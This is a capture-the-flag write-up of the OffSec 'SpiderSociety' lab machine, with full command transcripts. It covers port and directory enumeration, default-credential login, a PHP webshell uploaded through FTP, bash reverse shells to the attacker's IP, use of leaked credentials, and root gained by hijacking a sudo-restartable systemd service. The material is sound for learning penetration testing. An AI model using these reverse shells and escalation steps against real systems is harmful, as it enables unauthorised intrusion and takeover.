# CTF Writeup: SpiderSociety

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.207.214
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-02 14:37 -0500
Nmap scan report for 192.168.207.214
Host is up (0.033s latency).
Not shown: 55531 filtered tcp ports (no-response), 10001 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:5a:a9:66:65:3e:d0:b8:9d:a5:16:8c:e8:16:37:e2 (ECDSA)
|_  256 9b:2d:1d:f8:13:74:ce:96:82:4e:19:35:f9:7e:1b:68 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
2121/tcp open  ftp     vsftpd 3.0.5
Aggressive OS guesses: Linux 5.0 - 5.14 (98%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (98%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.13 (93%), Linux 5.0 (92%), OpenWrt 22.03 (Linux 5.10) (92%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (90%), Linux 4.15 (90%), Linux 2.6.32 - 3.10 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 42843/tcp)
HOP RTT      ADDRESS
1   31.80 ms 192.168.45.1
2   31.78 ms 192.168.45.254
3   31.90 ms 192.168.251.1
4   31.93 ms 192.168.207.214

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.82 seconds
```

Identified an potential domain on the website running on port 80, let's map it to our target ip in our local dns file /etc/hosts.

```
echo "192.168.207.214 spidersociety.offsec.lab" | sudo tee -a /etc/hosts
192.168.207.214 spidersociety.offsec.lab
```

Enumerating endpoints didn't retrieve anything.

```
feroxbuster -u http://192.168.207.214
                                                                                                                                              
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.207.214/
 🚩  In-Scope Url          │ 192.168.207.214
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      319c http://192.168.207.214/images => http://192.168.207.214/images/
200      GET       49l      117w     1391c http://192.168.207.214/404.html
200      GET      769l     4401w   348064c http://192.168.207.214/images/spider-logo-nobck.png
200      GET      678l     4172w   409965c http://192.168.207.214/images/spider-join.png
200      GET      911l     5236w   493726c http://192.168.207.214/images/spider-events.png
200      GET      868l     5310w   495911c http://192.168.207.214/images/spider-mission.png
200      GET      808l     4982w   470907c http://192.168.207.214/images/spider-values.png
200      GET     6585l    16255w   322360c http://192.168.207.214/images/spider-logo.svg
200      GET     2964l    24253w  2405710c http://192.168.207.214/images/spider-network.png
200      GET      106l      407w     4317c http://192.168.207.214/
[####################] - 35s    60011/60011   0s      found:10      errors:26     
[####################] - 32s    30000/30000   925/s   http://192.168.207.214/ 
[####################] - 34s    30000/30000   891/s   http://192.168.207.214/images/
```

Enumerated an interesting endpoint /libspider.

```
gobuster dir -u http://spidersociety.offsec.lab -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://spidersociety.offsec.lab
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 337] [--> http://spidersociety.offsec.lab/images/]
/server-status        (Status: 403) [Size: 289]
/libspider            (Status: 301) [Size: 340] [--> http://spidersociety.offsec.lab/libspider/]
Progress: 155375 / 220558 (70.45%)
```

I guessed credentials and successfully logged in.

```
admin:admin
```

Upon inspecting the page I retrieved credentials at the "Communications" tab.

```
ss_ftpbckuser:ss_WeLoveSpiderSociety_From_Tech_Dept5937!
```

Logged into ftp with those credentials.

```
ftp spidersociety.offsec.lab 2121    
Connected to spidersociety.offsec.lab.
220 (vsFTPd 3.0.5)
Name (spidersociety.offsec.lab:saitama): ss_ftpbckuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

We navigated into the libspider directory and retrieved a lot of files, which didn't lead to anything.

The ftp share seems to be the webroot of the server, let's check if we have write access!

We do! Let's upload an webshell.

We successfully uploaded wolfswebshell.php and gave it executable permissions.

```
ftp> chmod 755 wolfswebshell.php
200 SITE CHMOD command ok.
```

Now we are able to view the file and got command execution, let's get RCE!

Started up listener on port 80.

```
nc -lvnp 80
```

Executed the following command on the server.

```
/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.224/80 0>&1'
```

Gained RCE as user "www-data".

```
nc -lvnp 80                                 
listening on [any] 80 ...
connect to [192.168.45.224] from (UNKNOWN) [192.168.207.214] 47700
bash: cannot set terminal process group (1241): Inappropriate ioctl for device
bash: no job control in this shell
www-data@spidersociety:/var/www/html$
```

## Privilege Escalation

Performed Shell Hardening.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo ; fg ; reset
stty columns 200 rows 200
export TERM=xterm
```

We are now able to view the file within the /libspider directory.

```
www-data@spidersociety:/var/www/html/libspider$ cat .fuhfjkzbdsfuybefzmdbbzdcbhjzdbcukbdvbsdvuibdvnbdvenv
FTP_BACKUP_USER=ss_ftpbckuser
FTP_BACKUP_PASS=ss_WeLoveSpiderSociety_From_Tech_Dept5937!

DB_CONNECT_USER=spidey
DB_CONNECT_PASS=WithGreatPowerComesGreatSecurity99!
```

Logged into user "spidey" with spidey:WithGreatPowerComesGreatSecurity99!

```
www-data@spidersociety:/var/www/html/libspider$ su spidey
Password: 
spidey@spidersociety:/var/www/html/libspider$
```

Retrieved local.txt in /home/spidey directory.

```
4e2dbffff89d4be0f75817b71abc0561
```

Enumerated writable systemfiles.

```
spidey@spidersociety:/backup$ find /etc -writable 2>/dev/null
/etc/systemd/system/multi-user.target.wants/spiderbackup.service
/etc/systemd/system/spiderbackup.service
/etc/systemd/system-generators/systemd-gpt-auto-generator
```

Enumerated sudo permissions for user "spidey".

```
spidey@spidersociety:/backup$ sudo -l
Matching Defaults entries for spidey on spidersociety:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User spidey may run the following commands on spidersociety:
    (ALL) NOPASSWD: /bin/systemctl restart spiderbackup.service
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) !/bin/bash, !/bin/sh, !/bin/su, !/usr/bin/sudo
```

We will modify the spiderbackup.service, so it executes an reverse shell script.

```
spidey@spidersociety:/backup$ cat /etc/systemd/system/spiderbackup.service
[Unit]
Description=Spider Society Backup Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.224/2121 0>&1'
User=root
Group=root

[Install]
WantedBy=multi-user.target
```

Started up listener on port 2121.

```
nc -lvnp 2121
```

Restarted service.

```
spidey@spidersociety:/backup$ sudo /bin/systemctl restart spiderbackup.service
Warning: The unit file, source configuration file or drop-ins of spiderbackup.service changed on disk. Run 'systemctl daemon-reload' to reload units.
spidey@spidersociety:/backup$ sudo /bin/systemctl daemon-reload
spidey@spidersociety:/backup$ sudo /bin/systemctl restart spiderbackup.service
```

Gained RCE as user "root".

```
nc -lvnp 2121
listening on [any] 2121 ...
connect to [192.168.45.224] from (UNKNOWN) [192.168.207.214] 55940
bash: cannot set terminal process group (22051): Inappropriate ioctl for device
bash: no job control in this shell
root@spidersociety:/#
```

Retrieved proof.txt in /root directory.

```
22b3abf9a3f760a914337db5ca39f3c2
```
